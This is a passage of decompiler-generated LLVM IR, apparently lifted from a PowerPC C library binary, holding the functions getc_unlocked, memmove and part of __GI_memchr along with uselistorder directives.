  uselistorder label %dec_label_pc_10012334, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10012294, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012244.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10012230, { 1, 0 }
  uselistorder label %dec_label_pc_1001220c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100121e0, { 1, 0 }
  uselistorder label %dec_label_pc_100121cc, { 1, 0 }
  uselistorder label %dec_label_pc_100121b0, { 1, 0 }
  uselistorder label %dec_label_pc_10012188, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012168, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012144, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012128, { 1, 0 }
  uselistorder label %dec_label_pc_10012098, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012034, { 1, 0 }
  uselistorder label %dec_label_pc_10011ff4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011fb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011f8c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10011ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10011de8, { 1, 0 }
  uselistorder label %dec_label_pc_10011d40, { 1, 0 }
  uselistorder label %dec_label_pc_10011d14, { 1, 0 }
  uselistorder label %dec_label_pc_10011d08, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10012388 = load i32, i32* @lr, align 4
  store i32 %v0_10012388, i32* %r0.global-to-local, align 4
  %v0_10012390 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1001239c = add i32 %tmp, 16
  %v3_1001239c = inttoptr i32 %v2_1001239c to i32*
  %v4_1001239c = load i32, i32* %v3_1001239c, align 4
  store i32 %v4_1001239c, i32* %r9.global-to-local, align 4
  %v2_100123a0 = add i32 %tmp, 24
  %v3_100123a0 = inttoptr i32 %v2_100123a0 to i32*
  %v4_100123a0 = load i32, i32* %v3_100123a0, align 4
  store i32 %v4_100123a0, i32* %r0.global-to-local, align 4
  %v2_100123a4 = icmp ult i32 %v4_1001239c, %v4_100123a0
  br i1 %v2_100123a4, label %dec_label_pc_1001240c, label %dec_label_pc_100123ac

dec_label_pc_100123ac:                            ; preds = %entry
  %v3_100123ac = load i16, i16* %arg1, align 2
  %v4_100123ac = zext i16 %v3_100123ac to i32
  %v1_100123b0 = and i32 %v4_100123ac, 131
  store i32 %v1_100123b0, i32* %r0.global-to-local, align 4
  %v2_100123b4 = icmp ugt i32 %v1_100123b0, 128
  br i1 %v2_100123b4, label %dec_label_pc_100123cc, label %dec_label_pc_100123bc

dec_label_pc_100123bc:                            ; preds = %dec_label_pc_100123ac
  store i32 268510148, i32* @lr, align 4
  %v3_100123c0 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_1001239c)
  store i32 %v3_100123c0, i32* %r3.global-to-local, align 4
  %v3_100123c4 = icmp eq i32 %v3_100123c0, 0
  br i1 %v3_100123c4, label %dec_label_pc_100123bc.dec_label_pc_100123cc_crit_edge, label %dec_label_pc_100124a8

dec_label_pc_100123bc.dec_label_pc_100123cc_crit_edge: ; preds = %dec_label_pc_100123bc
  %v0_100123cc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100123cc

dec_label_pc_100123cc:                            ; preds = %dec_label_pc_100123bc.dec_label_pc_100123cc_crit_edge, %dec_label_pc_100123ac
  %v2_1001242c = phi i32 [ %v0_100123cc.pre, %dec_label_pc_100123bc.dec_label_pc_100123cc_crit_edge ], [ %tmp, %dec_label_pc_100123ac ]
  %v1_100123cc = inttoptr i32 %v2_1001242c to i16*
  %v2_100123cc = load i16, i16* %v1_100123cc, align 2
  %v3_100123cc = zext i16 %v2_100123cc to i32
  %v1_100123d0 = and i32 %v3_100123cc, 2
  store i32 %v1_100123d0, i32* %r0.global-to-local, align 4
  %v3_100123d0 = icmp eq i32 %v1_100123d0, 0
  br i1 %v3_100123d0, label %dec_label_pc_100123fc, label %dec_label_pc_100123d8

dec_label_pc_100123d8:                            ; preds = %dec_label_pc_100123cc
  %v1_100123d8 = call i32 @__asm_rlwinm(i32 %v3_100123cc, i32 2, i32 29, i32 29)
  %v1_100123dc = load i32, i32* @r31, align 4
  %v2_100123dc = add i32 %v1_100123dc, %v1_100123d8
  store i32 %v2_100123dc, i32* %r9.global-to-local, align 4
  %v1_100123e0 = add i32 %v2_100123dc, 39
  %v2_100123e0 = inttoptr i32 %v1_100123e0 to i8*
  %v3_100123e0 = load i8, i8* %v2_100123e0, align 1
  %v4_100123e0 = zext i8 %v3_100123e0 to i32
  store i32 %v4_100123e0, i32* %r0.global-to-local, align 4
  %v1_100123e4 = add nsw i32 %v3_100123cc, -1
  store i32 %v1_100123e4, i32* %r9.global-to-local, align 4
  %v1_100123e8 = trunc i32 %v1_100123e4 to i16
  %v3_100123e8 = inttoptr i32 %v1_100123dc to i16*
  store i16 %v1_100123e8, i16* %v3_100123e8, align 2
  %v0_100123ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100123ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100123f4 = load i32, i32* @r31, align 4
  %v2_100123f4 = add i32 %v1_100123f4, 40
  %v3_100123f4 = inttoptr i32 %v2_100123f4 to i32*
  store i32 0, i32* %v3_100123f4, align 4
  br label %dec_label_pc_100124ac

dec_label_pc_100123fc:                            ; preds = %dec_label_pc_100123cc
  %v1_100123fc = add i32 %v2_1001242c, 16
  %v2_100123fc = inttoptr i32 %v1_100123fc to i32*
  %v3_100123fc = load i32, i32* %v2_100123fc, align 4
  store i32 %v3_100123fc, i32* %r9.global-to-local, align 4
  %v1_10012400 = add i32 %v2_1001242c, 20
  %v2_10012400 = inttoptr i32 %v1_10012400 to i32*
  %v3_10012400 = load i32, i32* %v2_10012400, align 4
  store i32 %v3_10012400, i32* %r0.global-to-local, align 4
  %v4_10012404 = icmp eq i32 %v3_10012400, %v3_100123fc
  br i1 %v4_10012404, label %dec_label_pc_10012418, label %dec_label_pc_1001240c

dec_label_pc_1001240c:                            ; preds = %dec_label_pc_100123fc, %entry
  %v1_100124807 = phi i32 [ %v2_1001242c, %dec_label_pc_100123fc ], [ %tmp, %entry ]
  %v0_1001240c = phi i32 [ %v3_100123fc, %dec_label_pc_100123fc ], [ %v4_1001239c, %entry ]
  %v1_1001240c = inttoptr i32 %v0_1001240c to i8*
  %v2_1001240c = load i8, i8* %v1_1001240c, align 1
  %v3_1001240c = zext i8 %v2_1001240c to i32
  store i32 %v3_1001240c, i32* %r3.global-to-local, align 4
  %v1_10012410 = add i32 %v0_1001240c, 1
  store i32 %v1_10012410, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10012480

dec_label_pc_10012418:                            ; preds = %dec_label_pc_100123fc
  %v1_10012418 = add i32 %v2_1001242c, 4
  %v2_10012418 = inttoptr i32 %v1_10012418 to i32*
  %v3_10012418 = load i32, i32* %v2_10012418, align 4
  store i32 %v3_10012418, i32* %r0.global-to-local, align 4
  %v3_1001241c = icmp eq i32 %v3_10012418, -2
  br i1 %v3_1001241c, label %dec_label_pc_10012424, label %dec_label_pc_10012434

dec_label_pc_10012424:                            ; preds = %dec_label_pc_10012418
  %v1_10012424 = or i32 %v3_100123cc, 4
  store i32 %v1_10012424, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1001242c = trunc i32 %v1_10012424 to i16
  store i16 %v1_1001242c, i16* %v1_100123cc, align 2
  br label %dec_label_pc_100124ac

dec_label_pc_10012434:                            ; preds = %dec_label_pc_10012418
  %v1_10012434 = and i32 %v3_100123cc, 768
  store i32 %v1_10012434, i32* %r0.global-to-local, align 4
  %v3_10012434 = icmp eq i32 %v1_10012434, 0
  br i1 %v3_10012434, label %dec_label_pc_10012448, label %dec_label_pc_1001243c

dec_label_pc_1001243c:                            ; preds = %dec_label_pc_10012434
  store i32 ptrtoint (i32** @global_var_100287b8.615 to i32), i32* %r3.global-to-local, align 4
  store i32 268510280, i32* @lr, align 4
  %v4_10012444 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_100287b8.615 to i16*), i32 %v3_100123fc)
  store i32 %v4_10012444, i32* %r3.global-to-local, align 4
  %v0_10012448.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012448

dec_label_pc_10012448:                            ; preds = %dec_label_pc_10012434, %dec_label_pc_1001243c
  %v0_10012488 = phi i32 [ %v2_1001242c, %dec_label_pc_10012434 ], [ %v0_10012448.pre, %dec_label_pc_1001243c ]
  %v1_10012448 = add i32 %v0_10012488, 8
  %v2_10012448 = inttoptr i32 %v1_10012448 to i32*
  %v3_10012448 = load i32, i32* %v2_10012448, align 4
  store i32 %v3_10012448, i32* %r9.global-to-local, align 4
  %v1_1001244c = add i32 %v0_10012488, 12
  %v2_1001244c = inttoptr i32 %v1_1001244c to i32*
  %v3_1001244c = load i32, i32* %v2_1001244c, align 4
  store i32 %v3_1001244c, i32* %r0.global-to-local, align 4
  %v4_10012450 = icmp eq i32 %v3_1001244c, %v3_10012448
  br i1 %v4_10012450, label %dec_label_pc_10012488, label %dec_label_pc_10012458

dec_label_pc_10012458:                            ; preds = %dec_label_pc_10012448
  %v2_10012458 = add i32 %v0_10012488, 24
  %v3_10012458 = inttoptr i32 %v2_10012458 to i32*
  store i32 %v3_10012448, i32* %v3_10012458, align 4
  %v0_1001245c = load i32, i32* @r31, align 4
  store i32 %v0_1001245c, i32* %r3.global-to-local, align 4
  store i32 268510308, i32* @lr, align 4
  %v3_10012460 = call i32 @__stdio_rfill(i32 %v0_1001245c, i32 %v3_10012448)
  store i32 %v3_10012460, i32* %r3.global-to-local, align 4
  %v3_10012464 = icmp eq i32 %v3_10012460, 0
  br i1 %v3_10012464, label %dec_label_pc_100124a8, label %dec_label_pc_1001246c

dec_label_pc_1001246c:                            ; preds = %dec_label_pc_10012458
  %v0_1001246c = load i32, i32* @r31, align 4
  %v1_1001246c = add i32 %v0_1001246c, 20
  %v2_1001246c = inttoptr i32 %v1_1001246c to i32*
  %v3_1001246c = load i32, i32* %v2_1001246c, align 4
  store i32 %v3_1001246c, i32* %r0.global-to-local, align 4
  %v1_10012470 = add i32 %v0_1001246c, 16
  %v2_10012470 = inttoptr i32 %v1_10012470 to i32*
  %v3_10012470 = load i32, i32* %v2_10012470, align 4
  store i32 %v3_10012470, i32* %r9.global-to-local, align 4
  %v2_10012474 = add i32 %v0_1001246c, 24
  %v3_10012474 = inttoptr i32 %v2_10012474 to i32*
  store i32 %v3_1001246c, i32* %v3_10012474, align 4
  %v0_10012478 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012478 = add i32 %v0_10012478, 1
  store i32 %v1_10012478, i32* %r0.global-to-local, align 4
  %v1_1001247c = inttoptr i32 %v0_10012478 to i8*
  %v2_1001247c = load i8, i8* %v1_1001247c, align 1
  %v3_1001247c = zext i8 %v2_1001247c to i32
  store i32 %v3_1001247c, i32* %r3.global-to-local, align 4
  %v1_10012480.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012480

dec_label_pc_10012480:                            ; preds = %dec_label_pc_1001240c, %dec_label_pc_1001246c
  %v1_10012480 = phi i32 [ %v1_100124807, %dec_label_pc_1001240c ], [ %v1_10012480.pre, %dec_label_pc_1001246c ]
  %v0_10012480 = phi i32 [ %v1_10012410, %dec_label_pc_1001240c ], [ %v1_10012478, %dec_label_pc_1001246c ]
  %v2_10012480 = add i32 %v1_10012480, 16
  %v3_10012480 = inttoptr i32 %v2_10012480 to i32*
  store i32 %v0_10012480, i32* %v3_10012480, align 4
  br label %dec_label_pc_100124ac

dec_label_pc_10012488:                            ; preds = %dec_label_pc_10012448
  %v1_10012488 = inttoptr i32 %v0_10012488 to i16*
  store i32 %v0_10012488, i32* %r3.global-to-local, align 4
  %v2_1001248c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268510360, i32* @lr, align 4
  %v5_10012494 = call i32 @__stdio_READ(i16* %v1_10012488, i32 %v2_1001248c, i32 1)
  store i32 %v5_10012494, i32* %r3.global-to-local, align 4
  %v3_10012498 = icmp eq i32 %v5_10012494, 0
  br i1 %v3_10012498, label %dec_label_pc_100124a8, label %dec_label_pc_100124a0

dec_label_pc_100124a0:                            ; preds = %dec_label_pc_10012488
  %v3_100124a0 = load i8, i8* %stack_var_-24, align 1
  %v4_100124a0 = sext i8 %v3_100124a0 to i32
  store i32 %v4_100124a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100124ac

dec_label_pc_100124a8:                            ; preds = %dec_label_pc_100123bc, %dec_label_pc_10012488, %dec_label_pc_10012458
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100124ac

dec_label_pc_100124ac:                            ; preds = %dec_label_pc_100124a0, %dec_label_pc_10012480, %dec_label_pc_10012424, %dec_label_pc_100123d8, %dec_label_pc_100124a8
  store i32 %v0_10012388, i32* %r0.global-to-local, align 4
  store i32 %v0_10012390, i32* @r31, align 4
  %v0_100124bc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100124bc

; uselistorder directives
  uselistorder i32 %v0_10012488, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1001240c, { 1, 0 }
  uselistorder i32 %v3_100123fc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100123dc, { 1, 0 }
  uselistorder i32 %v3_100123cc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1001242c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_100287b8.615 to i16*), { 1, 0 }
  uselistorder i16* @global_var_10028490.310, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100124ac, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100124a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10012480, { 1, 0 }
  uselistorder label %dec_label_pc_10012448, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_100124c0 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_100124c8 = load i32, i32* @r5, align 4
  store i32 %v0_100124c8, i32* @r11, align 4
  br i1 %v2_100124c0, label %dec_label_pc_100124d4, label %dec_label_pc_100124d0

dec_label_pc_100124d0:                            ; preds = %entry
  %v0_100124d0 = call i32 @memcpy()
  store i32 %v0_100124d0, i32* @r3, align 4
  %v0_100124d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_100124d4

dec_label_pc_100124d4:                            ; preds = %entry, %dec_label_pc_100124d0
  %v0_100124d4 = phi i32 [ %v0_100124c8, %entry ], [ %v0_100124d4.pre, %dec_label_pc_100124d0 ]
  %v1_100124d4 = call i32 @__asm_rlwinm.(i32 %v0_100124d4, i32 29, i32 3, i32 31)
  store i32 %v1_100124d4, i32* %r9.global-to-local, align 4
  %v4_100124d4 = icmp eq i32 %v1_100124d4, 0
  %v1_100124d8 = load i32, i32* @r5, align 4
  %v2_100124d8 = add i32 %v1_100124d8, %arg2
  store i32 %v2_100124d8, i32* %r4.global-to-local, align 4
  %v0_100124dc = load i32, i32* @r3, align 4
  %v2_100124dc = add i32 %v0_100124dc, %v1_100124d8
  store i32 %v2_100124dc, i32* %r10.global-to-local, align 4
  br i1 %v4_100124d4, label %dec_label_pc_10012504, label %dec_label_pc_100124e4

dec_label_pc_100124e4:                            ; preds = %dec_label_pc_100124d4
  %v1_100124e4 = urem i32 %v2_100124dc, 4
  %v3_100124e4 = icmp eq i32 %v1_100124e4, 0
  br i1 %v3_100124e4, label %dec_label_pc_100124ec, label %dec_label_pc_10012538

dec_label_pc_100124ec:                            ; preds = %dec_label_pc_10012550.dec_label_pc_100124ec_crit_edge, %dec_label_pc_100124e4
  %v1_100124f8.pre = phi i32 [ %v1_100124f8.pre.pre, %dec_label_pc_10012550.dec_label_pc_100124ec_crit_edge ], [ %v2_100124dc, %dec_label_pc_100124e4 ]
  %v0_100124ec = phi i32 [ %v1_10012550, %dec_label_pc_10012550.dec_label_pc_100124ec_crit_edge ], [ %v1_100124d4, %dec_label_pc_100124e4 ]
  store i32 %v0_100124ec, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100124f0

dec_label_pc_100124f0:                            ; preds = %dec_label_pc_100124f0, %dec_label_pc_100124ec
  %v1_100124f8 = phi i32 [ %v2_100124fc, %dec_label_pc_100124f0 ], [ %v1_100124f8.pre, %dec_label_pc_100124ec ]
  %v0_100124f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100124f0 = add i32 %v0_100124f0, -4
  %v2_100124f0 = inttoptr i32 %v1_100124f0 to i32*
  %v3_100124f0 = load i32, i32* %v2_100124f0, align 4
  %v1_100124f4 = add i32 %v0_100124f0, -8
  %v2_100124f4 = inttoptr i32 %v1_100124f4 to i32*
  %v3_100124f4 = load i32, i32* %v2_100124f4, align 4
  store i32 %v3_100124f4, i32* %r9.global-to-local, align 4
  store i32 %v1_100124f4, i32* %r4.global-to-local, align 4
  %v2_100124f8 = add i32 %v1_100124f8, -4
  %v3_100124f8 = inttoptr i32 %v2_100124f8 to i32*
  store i32 %v3_100124f0, i32* %v3_100124f8, align 4
  %v0_100124fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100124fc = load i32, i32* %r10.global-to-local, align 4
  %v2_100124fc = add i32 %v1_100124fc, -8
  %v3_100124fc = inttoptr i32 %v2_100124fc to i32*
  store i32 %v0_100124fc, i32* %v3_100124fc, align 4
  store i32 %v2_100124fc, i32* %r10.global-to-local, align 4
  %v0_10012500 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012500 = add i32 %v0_10012500, -1
  store i32 %v1_10012500, i32* %ctr.global-to-local, align 4
  %v2_10012500 = icmp eq i32 %v1_10012500, 0
  br i1 %v2_10012500, label %dec_label_pc_10012504, label %dec_label_pc_100124f0

dec_label_pc_10012504:                            ; preds = %dec_label_pc_100124f0, %dec_label_pc_10012550, %dec_label_pc_100124d4
  %v0_10012504 = load i32, i32* @r11, align 4
  %v1_10012504 = urem i32 %v0_10012504, 8
  store i32 %v1_10012504, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10012504, 4
  br i1 %tmp, label %dec_label_pc_1001251c, label %dec_label_pc_10012510

dec_label_pc_10012510:                            ; preds = %dec_label_pc_10012504
  %v0_10012510 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012510 = add i32 %v0_10012510, -4
  %v2_10012510 = inttoptr i32 %v1_10012510 to i32*
  %v3_10012510 = load i32, i32* %v2_10012510, align 4
  store i32 %v1_10012510, i32* %r4.global-to-local, align 4
  %v1_10012514 = add nsw i32 %v1_10012504, -4
  store i32 %v1_10012514, i32* %r5.global-to-local, align 4
  %v1_10012518 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012518 = add i32 %v1_10012518, -4
  %v3_10012518 = inttoptr i32 %v2_10012518 to i32*
  store i32 %v3_10012510, i32* %v3_10012518, align 4
  store i32 %v2_10012518, i32* %r10.global-to-local, align 4
  %v0_1001251c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001251c

dec_label_pc_1001251c:                            ; preds = %dec_label_pc_10012504, %dec_label_pc_10012510
  %v0_10012524 = phi i32 [ %v1_10012504, %dec_label_pc_10012504 ], [ %v0_1001251c.pre, %dec_label_pc_10012510 ]
  %v3_1001251c = icmp eq i32 %v0_10012524, 0
  br i1 %v3_1001251c, label %dec_label_pc_1001255c, label %dec_label_pc_10012524

dec_label_pc_10012524:                            ; preds = %dec_label_pc_1001251c
  store i32 %v0_10012524, i32* %ctr.global-to-local, align 4
  %v2_1001252c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012528

dec_label_pc_10012528:                            ; preds = %dec_label_pc_10012528, %dec_label_pc_10012524
  %v2_1001252c = phi i32 [ %v3_1001252c, %dec_label_pc_10012528 ], [ %v2_1001252c.pre, %dec_label_pc_10012524 ]
  %v0_10012528 = load i32, i32* %r4.global-to-local, align 4
  %v1_10012528 = add i32 %v0_10012528, -1
  %v2_10012528 = inttoptr i32 %v1_10012528 to i8*
  %v3_10012528 = load i8, i8* %v2_10012528, align 1
  store i32 %v1_10012528, i32* %r4.global-to-local, align 4
  %v3_1001252c = add i32 %v2_1001252c, -1
  %v4_1001252c = inttoptr i32 %v3_1001252c to i8*
  store i8 %v3_10012528, i8* %v4_1001252c, align 1
  store i32 %v3_1001252c, i32* %r10.global-to-local, align 4
  %v0_10012530 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012530 = add i32 %v0_10012530, -1
  store i32 %v1_10012530, i32* %ctr.global-to-local, align 4
  %v2_10012530 = icmp eq i32 %v1_10012530, 0
  br i1 %v2_10012530, label %dec_label_pc_1001255c, label %dec_label_pc_10012528

dec_label_pc_10012538:                            ; preds = %dec_label_pc_100124e4
  %v1_10012538 = sub nsw i32 4, %v1_100124e4
  store i32 %v1_10012538, i32* %ctr.global-to-local, align 4
  %v2_10012540 = sub i32 %v1_100124d8, %v1_10012538
  store i32 %v2_10012540, i32* @r11, align 4
  %v1_100125449 = add i32 %v2_100124d8, -1
  %v2_1001254410 = inttoptr i32 %v1_100125449 to i8*
  %v3_1001254411 = load i8, i8* %v2_1001254410, align 1
  store i32 %v1_100125449, i32* %r4.global-to-local, align 4
  %v3_1001254813 = add i32 %v2_100124dc, -1
  %v4_1001254814 = inttoptr i32 %v3_1001254813 to i8*
  store i8 %v3_1001254411, i8* %v4_1001254814, align 1
  store i32 %v3_1001254813, i32* %r10.global-to-local, align 4
  %v0_1001254c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001254c16 = add i32 %v0_1001254c15, -1
  store i32 %v1_1001254c16, i32* %ctr.global-to-local, align 4
  %v2_1001254c17 = icmp eq i32 %v1_1001254c16, 0
  br i1 %v2_1001254c17, label %dec_label_pc_10012550, label %dec_label_pc_10012544.dec_label_pc_10012544_crit_edge

dec_label_pc_10012544.dec_label_pc_10012544_crit_edge: ; preds = %dec_label_pc_10012538, %dec_label_pc_10012544.dec_label_pc_10012544_crit_edge
  %v3_1001254818 = phi i32 [ %v3_10012548, %dec_label_pc_10012544.dec_label_pc_10012544_crit_edge ], [ %v3_1001254813, %dec_label_pc_10012538 ]
  %v0_10012544.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10012544 = add i32 %v0_10012544.pre, -1
  %v2_10012544 = inttoptr i32 %v1_10012544 to i8*
  %v3_10012544 = load i8, i8* %v2_10012544, align 1
  store i32 %v1_10012544, i32* %r4.global-to-local, align 4
  %v3_10012548 = add i32 %v3_1001254818, -1
  %v4_10012548 = inttoptr i32 %v3_10012548 to i8*
  store i8 %v3_10012544, i8* %v4_10012548, align 1
  store i32 %v3_10012548, i32* %r10.global-to-local, align 4
  %v0_1001254c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001254c = add i32 %v0_1001254c, -1
  store i32 %v1_1001254c, i32* %ctr.global-to-local, align 4
  %v2_1001254c = icmp eq i32 %v1_1001254c, 0
  br i1 %v2_1001254c, label %dec_label_pc_10012550, label %dec_label_pc_10012544.dec_label_pc_10012544_crit_edge

dec_label_pc_10012550:                            ; preds = %dec_label_pc_10012544.dec_label_pc_10012544_crit_edge, %dec_label_pc_10012538
  %v0_10012550 = load i32, i32* @r11, align 4
  %v1_10012550 = call i32 @__asm_rlwinm.(i32 %v0_10012550, i32 29, i32 3, i32 31)
  store i32 %v1_10012550, i32* %r9.global-to-local, align 4
  %v4_10012550 = icmp eq i32 %v1_10012550, 0
  br i1 %v4_10012550, label %dec_label_pc_10012504, label %dec_label_pc_10012550.dec_label_pc_100124ec_crit_edge

dec_label_pc_10012550.dec_label_pc_100124ec_crit_edge: ; preds = %dec_label_pc_10012550
  %v1_100124f8.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100124ec

dec_label_pc_1001255c:                            ; preds = %dec_label_pc_10012528, %dec_label_pc_1001251c
  %v0_1001255c = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1001255c

; uselistorder directives
  uselistorder i32 %v1_10012550, { 1, 2, 0 }
  uselistorder i32 %v1_1001254c, { 1, 0 }
  uselistorder i32 %v3_10012548, { 1, 2, 0 }
  uselistorder i32 %v1_10012530, { 1, 0 }
  uselistorder i32 %v3_1001252c, { 1, 2, 0 }
  uselistorder i32 %v1_10012504, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10012500, { 1, 0 }
  uselistorder i32 %v2_100124fc, { 1, 2, 0 }
  uselistorder i32 %v1_100124e4, { 1, 0 }
  uselistorder i32 %v2_100124dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100124d8, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10012544.dec_label_pc_10012544_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001251c, { 1, 0 }
  uselistorder label %dec_label_pc_10012504, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100124d4, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10012568 = urem i32 %arg1, 256
  store i32 %v1_10012568, i32* %r4.global-to-local, align 4
  %v0_100125887 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1001258c13 = icmp eq i32 %arg2, 0
  br i1 %v2_1001258c13, label %dec_label_pc_10012594, label %dec_label_pc_10012590

dec_label_pc_10012574:                            ; preds = %dec_label_pc_10012590
  %v1_10012574 = inttoptr i32 %v0_10012574 to i8*
  %v2_10012574 = load i8, i8* %v1_10012574, align 1
  %v3_10012574 = zext i8 %v2_10012574 to i32
  %v0_10012578 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012578 = add i32 %v0_10012578, -1
  store i32 %v1_10012578, i32* %r5.global-to-local, align 4
  %v1_1001257c = load i32, i32* %r4.global-to-local, align 4
  %v4_1001257c = icmp eq i32 %v3_10012574, %v1_1001257c
  %v0_10012580 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1001257c, i32 %v0_10012580)
  %v0_10012584 = load i32, i32* @r3, align 4
  %v1_10012584 = add i32 %v0_10012584, 1
  store i32 %v1_10012584, i32* @r3, align 4
  %v0_1001258c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001258c = add i32 %v0_1001258c, -1
  store i32 %v1_1001258c, i32* %ctr.global-to-local, align 4
  %v2_1001258c = icmp eq i32 %v1_1001258c, 0
  br i1 %v2_1001258c, label %dec_label_pc_10012594.loopexit, label %dec_label_pc_10012590

dec_label_pc_10012590:                            ; preds = %entry, %dec_label_pc_10012574
  %v0_10012574 = phi i32 [ %v1_10012584, %dec_label_pc_10012574 ], [ %v0_100125887, %entry ]
  %v0_10012590.in.in = phi i32 [ %v1_10012584, %dec_label_pc_10012574 ], [ %v0_100125887, %entry ]
  %v0_10012590.in = urem i32 %v0_10012590.in.in, 4
  %v0_10012590 = icmp eq i32 %v0_10012590.in, 0
  br i1 %v0_10012590, label %dec_label_pc_10012594.loopexit, label %dec_label_pc_10012574

dec_label_pc_10012594.loopexit:                   ; preds = %dec_label_pc_10012590, %dec_label_pc_10012574
  %v0_100125bc16.ph = phi i32 [ %v1_10012584, %dec_label_pc_10012574 ], [ %v0_10012574, %dec_label_pc_10012590 ]
  %v0_10012594.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10012598.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012594

dec_label_pc_10012594:                            ; preds = %dec_label_pc_10012594.loopexit, %entry
